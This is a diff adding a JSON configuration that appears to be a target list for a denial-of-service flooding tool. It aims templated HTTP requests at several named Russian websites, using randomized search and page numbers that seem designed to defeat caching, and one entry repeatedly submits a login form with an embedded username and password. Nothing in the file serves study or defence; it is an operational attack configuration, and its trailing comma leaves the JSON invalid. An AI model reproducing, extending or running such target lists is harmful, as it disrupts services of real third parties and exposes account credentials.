@@ -1,0 +1,44 @@
+{
+  "targets": [
+    {
+      "target": "https://therussophile.org",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "path_qs": "/page/{{int(1,100)}}/?s={{str(1)}}&tf-scroll=1"
+      }
+    },
+    {
+      "target": "https://universe-tss.su",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "login=submit&login_name=vladimir52&login_password=Vladimirovic%21%4022",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://universe-tss.su/\"}",
+        "path_qs": "/main/",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://universe-tss.su",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://universe-tss.su/\"}",
+        "path_qs": "/main/page/{{int(1,1278)}}/"
+      }
+    },
+    {
+      "target": "https://vkirove.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://vkirove.ru/\"}",
+        "path_qs": "/news/pagen{{int(1,3351)}}/"
+      }
+    },
+    {
+      "target": "https://vm.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "path_qs": "/search/site?q={{str(1)}}&page={{int(1,100)}}"
+      }
+    },
+  ]
+}
